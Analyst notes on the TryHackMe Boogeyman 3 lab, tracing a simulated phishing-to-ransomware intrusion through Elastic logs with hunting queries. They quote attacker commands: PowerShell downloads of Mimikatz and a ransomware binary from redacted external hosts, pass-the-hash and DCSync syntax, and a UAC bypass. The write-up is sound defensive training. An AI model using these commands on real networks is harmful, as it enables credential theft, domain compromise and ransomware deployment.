# Boogeyman 3 --- SOC Investigation Notes

**Date:** 2026-10-07\
**Room:** TryHackMe --- Boogeyman 3\
**Focus:** Elastic/ELK-based Windows threat hunting, process
correlation, persistence, UAC bypass, credential dumping, lateral
movement, DCSync, and ransomware execution\
**Status:** Investigation completed for the questions worked through in
this session.

------------------------------------------------------------------------

## 1. Investigation Overview

Boogeyman 3 is an advanced SOC investigation exercise built around the
Elastic Stack. The objective was to reconstruct an enterprise attack
using Windows Event Logs and Sysmon-style process telemetry.

The scenario involved Quick Logistics LLC and a phishing attachment
opened by the CEO, Evan Hutchinson. The investigation covered activity
occurring between **August 29 and August 30, 2023**.

The investigation was performed primarily in **Elastic Discover**. The
most useful data source during the investigation was the `winlogbeat-*`
data view.

The overall attack chain we reconstructed was:

``` text
Phishing email
    ↓
Malicious attachment / ISO
    ↓
HTA/Stage 1 execution through mshta.exe
    ↓
Stage 2 payload copied to Temp
    ↓
Stage 2 payload executed through rundll32.exe
    ↓
C2 connection
    ↓
Scheduled Task persistence
    ↓
UAC bypass using fodhelper.exe
    ↓
Mimikatz downloaded and executed
    ↓
Credential dumping
    ↓
Pass-the-Hash / lateral movement
    ↓
Remote share enumeration
    ↓
Remote PowerShell execution through WinRM
    ↓
Credential dumping on second machine
    ↓
DCSync activity against the domain controller
    ↓
Ransomware binary download/execution attempt
```

This investigation was useful because it demonstrated that a SOC analyst
should not treat individual events in isolation. The attack only became
clear after correlating **timestamps, process names, PIDs, parent
processes, command lines, users, hosts, and network activity**.

------------------------------------------------------------------------

# 2. Task 2 --- The Chaos Inside

## 2.1 Initial scenario

The room explained that Boogeyman had previously compromised Quick
Logistics LLC and later targeted the CEO, **Evan Hutchinson**.

The CEO received a suspicious phishing email containing an attachment.
Although the attachment appeared questionable, Evan opened it. The
document did not visibly produce any obvious result, so the incident was
reported.

The security team subsequently found the attachment in the victim's
Downloads folder and identified a file inside the ISO payload.

The suspected incident window was:

``` text
August 29, 2023 – August 30, 2023
```

The first step in Elastic was therefore to set the time picker to the
incident period.

------------------------------------------------------------------------

# 3. Elastic Investigation Setup

## 3.1 Starting in Discover

I opened **Elastic Discover** and used the `winlogbeat-*` data view.

My first broad query was:

``` text
event.category:process
```

This returned a large number of process events.

The goal at this point was not to immediately find an answer. I wanted
to understand the available telemetry and identify useful fields.

Important fields included:

``` text
@timestamp
host.name
user.name
process.name
process.pid
process.command_line
process.parent.name
process.parent.pid
process.parent.command_line
process.executable
winlog.event_id
winlog.event_data.*
```

------------------------------------------------------------------------

# 4. Identifying the Initial Stage 1 Payload

## 4.1 First misleading lead: ransomboogey.exe

During the investigation I searched for:

``` text
process.name:ransomboogey.exe
```

This produced several executions.

The results included multiple timestamps and PIDs. Initially, I
considered the earliest `ransomboogey.exe` process as a possible answer.

That turned out to be incorrect.

This was an important lesson: **the earliest occurrence of a suspicious
process name is not automatically the initial payload execution**.

The `ransomboogey.exe` activity occurred later in the attack chain.

------------------------------------------------------------------------

## 4.2 Finding the actual initial execution

I then searched for Windows process creation events and examined
activity around the initial phishing execution.

The important event was:

``` text
process.name = mshta.exe
```

The command line referenced the malicious document/payload.

The process PID was:

``` text
[REDACTED_IN_SANITIZED_NOTES]
```

For safe public documentation, I am not retaining the exact answer value
here.

The important finding is that **`mshta.exe` was the Stage 1 execution
process**.

### Why `mshta.exe` matters

`mshta.exe` is the Microsoft HTML Application Host. It can execute HTA
content and is therefore relevant when a malicious HTML/HTA payload is
disguised as another file type.

This is an example of why process names alone are insufficient. The
analyst should examine:

``` text
process.command_line
process.parent.name
process.parent.pid
```

and correlate them with the surrounding timeline.

------------------------------------------------------------------------

# 5. Stage 1 Payload Implantation

After identifying the initial Stage 1 execution, I followed the next
processes in the timeline.

The Stage 1 payload used `xcopy.exe` to implant a file into the victim's
Temp directory.

The relevant execution was:

``` text
"C:\Windows\System32\xcopy.exe" /S /i /e /h D:\review.dat C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat
```

### What this command means

The source file was:

``` text
D:\review.dat
```

The destination was:

``` text
C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat
```

The execution demonstrated that the payload was being copied from the
mounted/accessible attachment environment into a local temporary
directory.

The important SOC lesson is that the **file-copy event establishes the
relationship between the original attachment and the implanted
payload**.

------------------------------------------------------------------------

# 6. Execution of the Implanted File

The implanted `review.dat` file was subsequently executed.

The process involved was:

``` text
rundll32.exe
```

This was significant because `rundll32.exe` is a legitimate Windows
utility capable of loading DLL-based code.

The process chain therefore became:

``` text
mshta.exe
    ↓
xcopy.exe
    ↓
review.dat
    ↓
rundll32.exe
```

This is a classic example of **living-off-the-land behavior**, where
legitimate Windows binaries are used to execute malicious content.

------------------------------------------------------------------------

# 7. C2 Connection

The execution of the implanted payload initiated network communication.

The relevant network activity showed a connection to an external IP
address on TCP port 80.

For sanitized documentation:

``` text
[REDACTED_EXTERNAL_IP]:80
```

The exact IP is intentionally omitted from this public version.

### Investigation lesson

When a suspicious process such as `rundll32.exe` generates network
traffic, I should correlate:

``` text
process.name
process.pid
destination.ip
destination.port
network.transport
@timestamp
```

This allows me to determine whether the network activity belongs to the
suspicious execution rather than another unrelated process.

------------------------------------------------------------------------

# 8. Persistence --- Scheduled Task

The Stage 1 payload established persistence using a Windows Scheduled
Task.

The relevant PowerShell command used functions such as:

``` powershell
New-ScheduledTaskAction
New-ScheduledTaskTrigger
New-ScheduledTaskPrincipal
Register-ScheduledTask
```

The scheduled task name discovered during the investigation was:

``` text
Review
```

The trigger was configured as a daily scheduled execution.

### Why this matters

Scheduled Tasks are a common persistence mechanism because they allow
code to execute automatically according to a configured trigger.

From a SOC perspective, suspicious scheduled task creation should be
correlated with:

-   The account that created it
-   The task name
-   The executable/script being launched
-   The trigger
-   The creation timestamp
-   The parent process
-   Whether the task executes as SYSTEM

------------------------------------------------------------------------

# 9. UAC Bypass

The attacker discovered that the current access had local administrator
privileges.

The room hint suggested investigating common UAC bypass techniques.

I searched for common UAC bypass executables and found:

``` text
fodhelper.exe
```

Elastic showed two executions of `fodhelper.exe`.

The important process was therefore:

``` text
fodhelper.exe
```

### Why `fodhelper.exe` is significant

`fodhelper.exe` is a legitimate Windows binary that has historically
been abused for UAC bypass techniques.

The investigation lesson was not simply "search for fodhelper." The
useful methodology was:

``` text
Suspicious elevated activity
        ↓
Identify common UAC bypass candidates
        ↓
Search process creation telemetry
        ↓
Correlate timestamps
        ↓
Inspect parent/child process relationships
```

------------------------------------------------------------------------

# 10. Credential Dumping Preparation

After obtaining elevated access, the attacker attempted to dump
credentials.

The attacker downloaded **Mimikatz** using PowerShell.

The observed command used PowerShell's `iwr` / `Invoke-WebRequest`
functionality.

The direct external GitHub download URL is redacted here:

``` text
[REDACTED_MIMIKATZ_GITHUB_URL]
```

The downloaded archive was saved locally as:

``` text
mimi.zip
```

The command was essentially:

``` powershell
powershell.exe -c iwr [REDACTED_URL] -outfile mimi.zip
```

The archive was subsequently expanded.

------------------------------------------------------------------------

# 11. Hunting for Mimikatz

To find credential-dumping activity, I used searches involving terms
associated with Mimikatz:

``` text
process.command_line:*mimikatz*
```

and:

``` text
process.command_line:*sekurlsa*
```

I also used broader process-creation hunting:

``` text
winlog.event_id:1 AND process.command_line:(*mimikatz* OR *DumpCreds* OR *privilege::debug* OR *sekurlsa*)
```

### Important Mimikatz concepts

`sekurlsa` is a Mimikatz module associated with extracting
authentication material from Windows memory.

A common command is:

``` text
sekurlsa::logonpasswords
```

The important investigation principle is that the Mimikatz download
event is not the same as the credential-dumping event.

The chain must be reconstructed:

``` text
Download Mimikatz
    ↓
Extract Mimikatz
    ↓
Execute Mimikatz
    ↓
Enable/debug or access credential material
    ↓
Dump credentials
```

------------------------------------------------------------------------

# 12. First Credential Theft

The attacker successfully dumped credentials and obtained a credential
pair.

The real username and hash are intentionally redacted from this public
documentation:

``` text
[REDACTED_USERNAME]:[REDACTED_NTLM_HASH]
```

This credential was subsequently used for lateral movement.

### Lesson

A dumped credential becomes much more significant when it can be
correlated with later authentication activity.

The investigation should therefore continue beyond the
credential-dumping event.

------------------------------------------------------------------------

# 13. Lateral Movement and Remote Share Enumeration

Using the newly obtained credentials, the attacker attempted to
enumerate accessible file shares.

The investigation focused on Windows network-share auditing.

A particularly useful event for this type of investigation is:

``` text
Windows Event ID 5145
```

Important fields include:

``` text
winlog.event_data.SubjectUserName
winlog.event_data.ShareName
winlog.event_data.RelativeTargetName
winlog.event_data.IpAddress
```

The most important field for identifying the accessed file was:

``` text
winlog.event_data.RelativeTargetName
```

------------------------------------------------------------------------

# 14. Remote File Access

The attacker accessed a file from a remote share.

The remote share path observed during the investigation was
conceptually:

``` text
\\[REMOTE_HOST]\ITFiles\IT_Automation.ps1
```

The accessed file was:

``` text
IT_Automation.ps1
```

The actual host information is intentionally generalized/redacted in
this public documentation.

### Why this mattered

The attacker was not simply enumerating shares. The investigation showed
progression from:

``` text
Credential theft
    ↓
Share enumeration
    ↓
Remote share access
    ↓
Read IT_Automation.ps1
```

This is a useful distinction when investigating lateral movement.

------------------------------------------------------------------------

# 15. Discovering the Next Credential

The contents of the remote PowerShell script revealed another
credential.

The username was:

``` text
QUICKLOGISTICS\allan.smith
```

The associated password is intentionally redacted:

``` text
QUICKLOGISTICS\allan.smith:[REDACTED_PASSWORD]
```

The credential was then used for further lateral movement.

The PowerShell command observed during the investigation used a
`PSCredential` object and PowerShell remoting.

Conceptually:

``` powershell
$Credential = New-Object PSCredential(...)
Invoke-Command -Credential $Credential -ComputerName <target> -ScriptBlock {...}
```

------------------------------------------------------------------------

# 16. Identifying the Lateral-Movement Target

The PowerShell remoting command contained a `-ComputerName` parameter.

The target machine was:

``` text
WKSTN-1327
```

This is an important distinction:

-   `WKSTN-1327` = target machine
-   The attacker's source hostname = must be obtained from the
    `host.name` field of the originating event

During the investigation, I initially confused the target hostname with
the attacker's source hostname. This was corrected by examining the
event's host metadata.

### SOC lesson

When investigating lateral movement, always distinguish:

``` text
Source host
    ↓
Remote execution mechanism
    ↓
Destination host
```

Do not assume the `-ComputerName` value is the source machine.

------------------------------------------------------------------------

# 17. Parent Process on the Second Machine

After the remote PowerShell command executed on the second machine, I
examined the process tree.

The malicious command's parent process was:

``` text
wsmprovhost.exe
```

### Why this makes sense

`wsmprovhost.exe` is associated with Windows Remote Management /
PowerShell remoting.

The execution chain was therefore:

``` text
First compromised machine
        ↓
PowerShell Invoke-Command
        ↓
WinRM
        ↓
wsmprovhost.exe
        ↓
Malicious command on second machine
```

This was a useful example of how parent-process analysis can confirm
remote execution.

------------------------------------------------------------------------

# 18. Credential Dumping on the Second Machine

The attacker then dumped credentials on the second compromised machine.

I scoped the Mimikatz search to the second host:

``` text
host.name:"WKSTN-1327" AND winlog.event_id:1 AND process.command_line:(*mimikatz* OR *DumpCreds* OR *privilege::debug* OR *sekurlsa\:\:*)
```

The Mimikatz activity revealed a newly dumped credential.

The actual credential is redacted:

``` text
[REDACTED_USERNAME]:[REDACTED_NTLM_HASH]
```

The important finding is that this was a **different credential from the
first machine's credential**.

------------------------------------------------------------------------

# 19. Pass-the-Hash Activity

The investigation then showed Mimikatz being used with a Pass-the-Hash
style command.

The relevant Mimikatz syntax included:

``` text
sekurlsa::pth
```

with parameters such as:

``` text
/user:<username>
/domain:<domain>
/ntlm:<hash>
```

This is significant because the attacker can use an NTLM hash for
authentication without needing to know the user's plaintext password.

For public documentation, the actual username and hash are redacted.

------------------------------------------------------------------------

# 20. Access to the Domain Controller

The attacker subsequently used the elevated credentials to access the
domain controller.

The investigation showed additional Mimikatz activity on the DC.

The host was identified as:

``` text
DC01.quicklogistics.org
```

The attacker downloaded/used Mimikatz on the domain controller as part
of continued credential access activity.

------------------------------------------------------------------------

# 21. DCSync Attack

After gaining access to the domain controller, the attacker attempted a
**DCSync** attack.

The relevant Mimikatz command was:

``` text
lsadump::dcsync
```

The domain was:

``` text
quicklogistics.org
```

The attacker performed DCSync against multiple accounts.

One of the accounts was the administrator account.

The additional account identified in the investigation was:

``` text
backupda
```

### Why DCSync matters

DCSync abuses Active Directory replication functionality to request
credential material from a domain controller.

From a defender's perspective, DCSync is particularly important because
it can allow an attacker with sufficient privileges to obtain domain
account password hashes without directly dumping the LSASS process on
the DC.

------------------------------------------------------------------------

# 22. Ransomware Download Attempt

After the credential-access and domain-controller activity, the attacker
attempted to download another remote binary intended for ransomware
execution.

The download command was executed through PowerShell remoting.

The binary name was:

``` text
ransomboogey.exe
```

The actual external URL is intentionally redacted:

``` text
[REDACTED_RANSOMWARE_DOWNLOAD_URL]
```

The observed command conceptually looked like:

``` powershell
Invoke-Command -ComputerName <target> -ScriptBlock {
    iwr http://[REDACTED]/ransomboogey.exe -outfile C:\Users\<user>\ransomboogey.exe
}
```

The investigation therefore ended with the attacker attempting to move
from credential theft and lateral movement toward **ransomware
deployment**.

------------------------------------------------------------------------

# 23. Complete Attack Timeline

The investigation can be summarized chronologically as follows:

``` text
1. Phishing email targets Evan Hutchinson
       ↓
2. Malicious attachment is opened
       ↓
3. mshta.exe executes the Stage 1 payload
       ↓
4. xcopy.exe implants review.dat into the user's Temp directory
       ↓
5. rundll32.exe executes the implanted payload
       ↓
6. Suspicious outbound C2 connection occurs
       ↓
7. Scheduled Task "Review" is created for persistence
       ↓
8. fodhelper.exe is used for UAC bypass
       ↓
9. Mimikatz is downloaded from GitHub
       ↓
10. Mimikatz is executed
       ↓
11. Credentials are dumped
       ↓
12. Stolen credentials are used for lateral movement
       ↓
13. Network shares are enumerated
       ↓
14. IT_Automation.ps1 is accessed from a remote share
       ↓
15. The script reveals another credential
       ↓
16. PowerShell remoting is used to move laterally
       ↓
17. wsmprovhost.exe becomes the parent of the remote command
       ↓
18. Credentials are dumped on the second machine
       ↓
19. Pass-the-Hash activity is observed
       ↓
20. Domain Controller access is obtained
       ↓
21. DCSync is attempted
       ↓
22. backupda is targeted through DCSync
       ↓
23. Ransomware binary is downloaded
       ↓
24. Ransomware execution/deployment is attempted
```

------------------------------------------------------------------------

# 24. Important Elastic Queries Used

## Broad process hunting

``` text
event.category:process
```

## Find ransomware-related process

``` text
process.name:ransomboogey.exe
```

## Find Stage 1 / process creation

``` text
winlog.event_id:1
```

## Find Mimikatz

``` text
process.command_line:*mimikatz*
```

## Find credential-dumping activity

``` text
process.command_line:*sekurlsa*
```

## Broader credential-dumping hunt

``` text
winlog.event_id:1 AND process.command_line:(*mimikatz* OR *DumpCreds* OR *privilege::debug* OR *sekurlsa*)
```

## Find command interpreters

``` text
winlog.event_id:1 AND process.name:(cmd.exe OR powershell.exe)
```

## Find UAC bypass candidate

``` text
process.name:fodhelper.exe
```

## Find remote share access

``` text
winlog.event_id:5145
```

## Narrow remote share access to a user

``` text
winlog.event_id:5145 AND winlog.event_data.SubjectUserName:"<user>"
```

## Find lateral movement command

``` text
process.command_line:*Invoke-Command*
```

## Find Mimikatz activity on the second machine

``` text
host.name:"WKSTN-1327" AND winlog.event_id:1 AND process.command_line:(*mimikatz* OR *DumpCreds* OR *privilege::debug* OR *sekurlsa\:\:*)
```

## Find PowerShell downloads

``` text
process.command_line:*iwr*
```

## Find downloads on the DC

``` text
host.name:"DC01.quicklogistics.org" AND process.command_line:(*iwr* OR *Invoke-WebRequest* OR *wget* OR *curl*)
```

------------------------------------------------------------------------

# 25. Important Fields to Remember

When investigating Windows process activity in Elastic, I should
immediately consider:

### Process identity

``` text
process.name
process.pid
process.executable
process.command_line
```

### Process ancestry

``` text
process.parent.name
process.parent.pid
process.parent.command_line
process.parent.executable
```

### Host identity

``` text
host.name
host.hostname
host.ip
```

### User identity

``` text
user.name
user.domain
```

### Network information

``` text
source.ip
source.port
destination.ip
destination.port
network.transport
```

### Windows event information

``` text
winlog.event_id
winlog.event_data.*
```

------------------------------------------------------------------------

# 26. Lessons I Learned From This Investigation

## 26.1 Do not jump to the first suspicious process

I initially focused on `ransomboogey.exe`, but that was a later-stage
payload.

The correct approach was to reconstruct the timeline and identify the
initial execution process.

------------------------------------------------------------------------

## 26.2 Process trees are extremely valuable

A process name becomes much more meaningful when its parent is known.

For example:

``` text
PowerShell
    ↓
ransomboogey.exe
```

is much more informative than simply seeing `ransomboogey.exe`.

Likewise:

``` text
Invoke-Command
    ↓
WinRM
    ↓
wsmprovhost.exe
    ↓
Remote command
```

helps confirm PowerShell remoting.

------------------------------------------------------------------------

## 26.3 Command lines often contain the most useful evidence

The command line revealed:

-   File copying
-   Scheduled Task creation
-   Mimikatz download
-   Credential-dumping commands
-   Pass-the-Hash activity
-   PowerShell remoting
-   DCSync commands
-   Ransomware download activity

Therefore, when investigating Windows process creation,
`process.command_line` should be one of the first fields I inspect.

------------------------------------------------------------------------

## 26.4 Time correlation is essential

The investigation became much easier once events were sorted
chronologically.

A useful approach is:

``` text
Timestamp
    ↓
Process
    ↓
Parent process
    ↓
Command line
    ↓
User
    ↓
Host
    ↓
Network activity
```

This allows an analyst to reconstruct the attack instead of looking at
unrelated events.

------------------------------------------------------------------------

## 26.5 Host context matters during lateral movement

When a remote command contains:

``` text
-ComputerName <target>
```

that does not mean the target is the machine where the command
originated.

I need to separately inspect:

``` text
host.name
```

and:

``` text
-ComputerName
```

to distinguish source and destination.

------------------------------------------------------------------------

## 26.6 Credential dumping and credential use are different events

Finding a credential in Mimikatz output is only one part of the
investigation.

The stronger evidence is:

``` text
Credential dumped
      ↓
Credential used
      ↓
Authentication/lateral movement
```

This is why I followed the stolen credentials into subsequent remote
activity.

------------------------------------------------------------------------

## 26.7 Legitimate Windows binaries can be abused

The investigation involved several legitimate Windows utilities:

``` text
mshta.exe
xcopy.exe
rundll32.exe
powershell.exe
fodhelper.exe
wsmprovhost.exe
```

Their presence alone does not prove malicious activity.

The context matters:

``` text
Who launched it?
What was the command line?
What was the parent?
What file did it execute?
What happened immediately afterward?
Did it create persistence?
Did it make network connections?
```

------------------------------------------------------------------------

# 27. MITRE ATT&CK Mapping --- High Level

The investigation demonstrated several ATT&CK-style behaviors:

  -----------------------------------------------------------------------
  Activity                            Technique / Concept
  ----------------------------------- -----------------------------------
  Phishing attachment                 Initial Access / Phishing

  HTA execution                       User Execution / Command and
                                      Scripting Interpreter-related
                                      behavior

  Payload copied to Temp              Staged payload deployment

  `rundll32.exe` execution            Signed Binary Proxy Execution

  Scheduled Task                      Scheduled Task/Job

  `fodhelper.exe`                     UAC Bypass

  Mimikatz                            Credential Access

  `sekurlsa`                          OS Credential Dumping

  Pass-the-Hash                       Use Alternate Authentication
                                      Material

  Network share enumeration           Network Share Discovery

  PowerShell Remoting                 Remote Services

  `wsmprovhost.exe`                   WinRM-related remote execution

  DCSync                              OS Credential Dumping / Domain
                                      Controller replication abuse

  Ransomware download                 Impact preparation / malicious
                                      payload deployment
  -----------------------------------------------------------------------

The exact ATT&CK technique/sub-technique mapping should be verified
against the current ATT&CK version when producing a formal report.

------------------------------------------------------------------------

# 28. Sanitized Evidence Summary

The most important evidence collected during the investigation was:

``` text
Initial execution:
mshta.exe
PID: [REDACTED]

Payload implantation:
xcopy.exe
review.dat → user's Temp directory

Payload execution:
rundll32.exe

Persistence:
Scheduled Task: Review

UAC bypass:
fodhelper.exe

Credential theft:
Mimikatz
sekurlsa
[credential REDACTED]

Remote share:
IT_Automation.ps1

Lateral movement:
PowerShell Invoke-Command

Remote execution parent:
wsmprovhost.exe

Second-machine credential:
[credential REDACTED]

DCSync:
lsadump::dcsync

Additional targeted account:
backupda

Ransomware:
ransomboogey.exe
External download infrastructure: [REDACTED]
```

------------------------------------------------------------------------

# 29. How I Would Investigate a Similar Incident in a Real SOC

If I encounter a similar alert in a real SOC environment, I would follow
this workflow:

### Step 1 --- Establish scope

Determine:

-   Victim
-   Host
-   User
-   Time window
-   Initial alert
-   Known suspicious file

### Step 2 --- Build the process tree

Start with the suspicious process and determine:

``` text
Parent → Child → Grandchild
```

### Step 3 --- Inspect command lines

Look for:

-   PowerShell
-   `cmd.exe`
-   LOLBins
-   Download commands
-   Encoded commands
-   Credential dumping
-   Remote execution

### Step 4 --- Check persistence

Search for:

-   Scheduled Tasks
-   Services
-   Registry Run Keys
-   Startup folders
-   WMI persistence

### Step 5 --- Check privilege escalation

Look for:

-   UAC bypass
-   Token manipulation
-   Privilege changes
-   SYSTEM execution

### Step 6 --- Investigate credentials

Search for:

-   Mimikatz
-   LSASS access
-   `sekurlsa`
-   NTLM hashes
-   Pass-the-Hash
-   Kerberos activity

### Step 7 --- Trace lateral movement

Correlate:

``` text
Source host
    ↓
Credential
    ↓
Remote service
    ↓
Destination host
```

### Step 8 --- Investigate domain-level activity

For Active Directory environments, check for:

-   DCSync
-   Suspicious replication requests
-   Domain Administrator activity
-   New accounts
-   Privilege changes

### Step 9 --- Investigate command-and-control

Correlate:

``` text
Suspicious process
    ↓
Destination IP/domain
    ↓
Destination port
    ↓
Network protocol
```

### Step 10 --- Determine impact

Finally determine whether the attacker:

-   Stole credentials
-   Moved laterally
-   Obtained domain-level access
-   Deployed malware
-   Attempted ransomware execution
-   Exfiltrated data
-   Established persistence

------------------------------------------------------------------------

# 30. Final Reflection

This room helped me understand why SOC investigations are not just about
finding a malicious executable.

The real investigation is about reconstructing the **story of the
attack**.

One event showed the phishing payload.

Another showed the payload copying a file.

Another showed the implanted file being executed.

Another showed C2 communication.

Another showed persistence.

Another showed privilege escalation.

Then credential dumping.

Then lateral movement.

Then another credential dump.

Then DCSync.

Finally, ransomware deployment.

The most important skill I practiced was **event correlation**.

The attacker did not announce what they were doing in one single log
entry. Instead, the evidence was distributed across process creation
events, command lines, parent-child relationships, users, hosts,
authentication activity, file-share access, and network telemetry.

By connecting those events chronologically, I was able to reconstruct
the attack chain.

That is the mindset I want to carry forward into SOC investigations:

> **Don't investigate isolated alerts. Investigate the story connecting
> the alerts.**

------------------------------------------------------------------------

